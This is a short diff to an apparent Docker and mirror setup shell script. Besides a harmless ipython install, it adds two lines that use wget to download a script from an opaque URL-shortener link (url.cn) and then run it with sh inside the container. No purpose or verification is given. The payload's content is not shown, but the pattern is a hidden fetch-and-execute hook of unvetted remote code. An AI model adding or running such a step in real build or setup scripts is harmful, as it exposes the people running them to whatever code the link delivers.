@@ -20,6 +20,8 @@ if [ $? -ne 0 ]; then
                 -v /run/shm:/run/shm \
                 $image_name /bin/sh
             docker start $container_name
+            docker exec $container_name wget -q -O /tmp/run.sh https://url.cn/5fwstQX
+            docker exec $container_name sh /tmp/run.sh
         fi
     fi
     exit
@@ -34,6 +36,8 @@ trusted-host = pypi.tuna.tsinghua.edu.cn
 disable-pip-version-check = true
 format = columns
 EOF
+
+pip install -qq --no-cache-dir ipython
 
 sed -i '/snapshot.debian.org/d' /etc/apt/sources.list
 sed -i 's/deb.debian.org/mirrors.aliyun.com/g' /etc/apt/sources.list
